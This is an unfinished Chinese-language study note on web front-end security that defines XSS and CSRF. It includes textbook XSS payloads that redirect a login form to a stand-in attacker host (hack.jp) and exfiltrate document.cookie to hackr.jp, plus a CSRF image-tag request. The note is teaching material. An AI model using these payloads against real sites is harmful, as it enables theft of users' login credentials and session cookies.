# Web 前端安全

__前言:__网络安全一直是风口浪尖，尤其这几年随着前端的发展和变化，前端的安全问题日益突出多学习。参考：《图解HTTP》

## XSS 跨站脚本攻击

>定义：

* Cross-Site Scripting 指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或js运行的一种攻击

>特点：

* 攻击者利用预先设置的陷阱触发的被动攻击
* 在动态生成HTML处生成

>场景：

* 登陆页表单验证

```HTML js
ID <input type="text" name="ID" value=""><script> var f = document.getElementById("login"); f.action = "http://hack.jp/pwget";f.method = "get";</script><span s="" />
```

* 恶意构造脚本，窃取用户的Cookie信息

```js
<script src="http://hacker.jp/xss.js">
var content = escape(document.cookie);
document.write("<img src=http://hackr.jp/?");
document.write(content);
document.write(">");
```

## CSRF 跨站点请求伪造

>定义：

* 攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。

>过程理解(以留言板为实际场景举例)

* 用户在留言板登陆，认证通过得到cookie：sid

* 攻击者在留言板上留下含恶意代码的评论如：

    ```HTML
    <img src="http://example.com/msg?q=你好">
    ```

* 用户触发陷阱，攻击者利用用户的权限发表用户非主观的动作（也就相当于是冒用别人的名义做一些事情），因为此时用户的浏览器的Cookie持有已认证的会话ID。

## 未完待续
